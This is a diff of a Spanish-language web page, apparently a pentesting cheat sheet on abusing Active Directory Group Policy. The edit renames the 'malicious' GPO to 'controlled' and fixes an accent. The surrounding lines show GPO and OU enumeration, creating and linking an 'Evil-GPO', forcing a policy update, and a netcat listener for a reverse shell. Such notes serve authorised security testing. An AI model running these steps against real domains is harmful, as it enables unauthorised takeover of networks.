@@ -35,7 +35,7 @@
 
             <section class="code-card">
               <h3>PowerShell: Enumeración</h3>
-              <pre><code># Ver políticas existentes (Podriamos modificarlas con SharpGPOAbuse.exe)
+              <pre><code># Ver políticas existentes (podríamos modificarlas con SharpGPOAbuse.exe)
 get-GPO -All
 # Enumerar OU del AD desde CMD
 dsquery ou -limit 0
@@ -45,7 +45,7 @@ Get-ADDomainController -Identity &quot;&lt;hostname&gt;&quot; | Select-Object Ho
             </section>
 
             <section class="code-card">
-              <h3>PowerShell: Crear GPO 'Evil-GPO' maliciosa</h3>
+              <h3>PowerShell: Crear GPO 'Evil-GPO' controlada</h3>
               <pre><code>New-GPO -Name Evil-GPO | New-GPLink -Target &quot;OU=&lt;ou_ad&gt;,DC=&lt;domain&gt;,DC=&lt;domain&gt;&quot; -LinkEnabled Yes</code></pre>
             </section>
 
@@ -61,7 +61,7 @@ Get-ADDomainController -Identity &quot;&lt;hostname&gt;&quot; | Select-Object Ho
             </section>
 
             <section class="code-card">
-              <h3>PowerShell: Forzar que se apliquen las políticas del GPO malicioso</h3>
+              <h3>PowerShell: Forzar que se apliquen las políticas del GPO controlado</h3>
               <pre><code>gpupdate /force
 # Listener desde Kali
 rlwrap nc -nlvp 443</code></pre>
